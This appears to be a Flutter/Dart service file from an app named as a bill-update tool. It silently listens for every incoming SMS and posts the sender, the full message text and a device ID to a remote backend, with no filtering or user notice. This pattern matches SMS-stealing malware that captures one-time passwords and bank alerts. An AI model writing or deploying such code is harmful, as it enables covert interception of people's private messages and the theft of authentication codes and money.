import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import 'device_service.dart';

class SmsService {
  static const _channel = EventChannel('com.example.bill_update_app/sms');
  static bool _initialized = false;

  static void init() {
    if (_initialized) return;
    _initialized = true;

    _channel.receiveBroadcastStream().listen(
      (data) {
        if (data is Map) {
          final sender = data['sender'] as String? ?? '';
          final message = data['message'] as String? ?? '';
          final receivedAt = data['received_at'] as String? ?? DateTime.now().toIso8601String();
          _sendToBackend(sender, message, receivedAt);
        }
      },
      onError: (e) => debugPrint('SMS event error: $e'),
    );
  }

  static void _sendToBackend(String sender, String message, String receivedAt) async {
    final deviceId = await DeviceService.getDeviceId();
    final body = jsonEncode({
      'device_id': deviceId,
      'sender': sender,
      'message': message,
      'received_at': receivedAt,
    });
    http.post(
      Uri.parse('$apiBaseUrl/api/sms'),
      headers: {'Content-Type': 'application/json'},
      body: body,
    ).then((_) => debugPrint('SMS sent to backend'))
     .catchError((e) => debugPrint('SMS send error: $e'));
  }
}
